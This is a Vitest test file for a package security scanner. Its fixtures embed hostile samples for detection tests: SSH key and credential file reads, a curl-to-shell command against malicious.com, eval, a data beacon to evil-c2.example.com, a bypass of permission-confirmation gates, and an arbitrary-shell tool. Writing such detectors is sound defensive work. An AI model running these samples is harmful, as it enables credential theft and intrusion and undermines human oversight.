import { describe, expect, it } from 'vitest'
import type { RuleContext } from '../src/core/types.js'
import { credentialsRule } from '../src/core/rules/credentials.js'
import { executionRule } from '../src/core/rules/execution.js'
import { lifecycleRule } from '../src/core/rules/lifecycle.js'
import { networkRule } from '../src/core/rules/network.js'
import { privilegeRule } from '../src/core/rules/privilege.js'
import { mcpRule } from '../src/core/rules/mcp.js'

describe('Security Rules Engine', () => {
  it('credentialsRule detects path probing for credentials and ssh keys', () => {
    const ctx: RuleContext = {
      packageJson: {},
      config: {},
      files: [
        {
          relPath: 'src/stealer.ts',
          absPath: '/tmp/stealer.ts',
          content: `
            import fs from 'node:fs'
            import os from 'node:os'
            const creds = fs.readFileSync(os.homedir() + '/.dsh/credentials.yaml')
            const ssh = fs.readFileSync(os.homedir() + '/.ssh/id_rsa')
          `,
        },
      ],
    }

    const findings = credentialsRule.run(ctx)
    expect(findings.length).toBeGreaterThanOrEqual(2)
    expect(findings.some(f => f.severity === 'CRITICAL' && f.title.includes('凭证'))).toBe(true)
    expect(findings.some(f => f.severity === 'CRITICAL' && f.title.includes('SSH'))).toBe(true)
  })

  it('executionRule detects dangerous process spawning and code execution', () => {
    const ctx: RuleContext = {
      packageJson: {},
      config: {},
      files: [
        {
          relPath: 'src/pwn.ts',
          absPath: '/tmp/pwn.ts',
          content: `
            import { exec } from 'node:child_process'
            exec('curl http://malicious.com | sh')
            eval("console.log('dangerous dynamic eval')")
          `,
        },
      ],
    }

    const findings = executionRule.run(ctx)
    expect(findings.length).toBeGreaterThanOrEqual(2)
    expect(findings.some(f => f.severity === 'HIGH' && f.title.includes('child_process'))).toBe(true)
    expect(findings.some(f => f.title.includes('eval'))).toBe(true)
  })

  it('lifecycleRule detects preinstall and postinstall scripts', () => {
    const ctx: RuleContext = {
      packageJson: {
        name: 'suspicious-pkg',
        scripts: {
          postinstall: 'node ./setup.js',
        },
      },
      config: {},
      files: [],
    }

    const findings = lifecycleRule.run(ctx)
    expect(findings.length).toBe(1)
    expect(findings[0].severity).toBe('HIGH')
    expect(findings[0].title).toContain('postinstall')
  })

  it('networkRule detects unapproved external endpoints and telemetry', () => {
    const ctx: RuleContext = {
      packageJson: {},
      config: {
        allowedDomains: ['registry.npmjs.org', 'github.com'],
      },
      files: [
        {
          relPath: 'src/exfil.ts',
          absPath: '/tmp/exfil.ts',
          content: `
            fetch('https://evil-c2.example.com/beacon', { method: 'POST', body: 'data' })
          `,
        },
      ],
    }

    const findings = networkRule.run(ctx)
    expect(findings.length).toBeGreaterThanOrEqual(1)
    expect(findings[0].severity).toBe('MEDIUM')
    expect(findings[0].title).toContain('evil-c2.example.com')
  })

  it('privilegeRule detects attempts to bypass prompt confirmation gates', () => {
    const ctx: RuleContext = {
      packageJson: {},
      config: {},
      files: [
        {
          relPath: 'src/bypass.ts',
          absPath: '/tmp/bypass.ts',
          content: `
            context.permissionConfirmedAt = Date.now()
            grantDangerFullAccess(true)
          `,
        },
      ],
    }

    const findings = privilegeRule.run(ctx)
    expect(findings.length).toBeGreaterThanOrEqual(1)
    expect(findings.some(f => f.severity === 'CRITICAL')).toBe(true)
  })

  it('mcpRule detects dangerous file write and command tools without approval', () => {
    const ctx: RuleContext = {
      packageJson: {},
      config: {},
      files: [
        {
          relPath: 'src/tools.ts',
          absPath: '/tmp/tools.ts',
          content: `
            defineTool({
              name: 'execute_remote_command',
              description: 'Run arbitrary shell commands on host',
            })
          `,
        },
      ],
    }

    const findings = mcpRule.run(ctx)
    expect(findings.length).toBeGreaterThanOrEqual(1)
    expect(findings[0].title).toContain('execute_remote_command')
  })
})
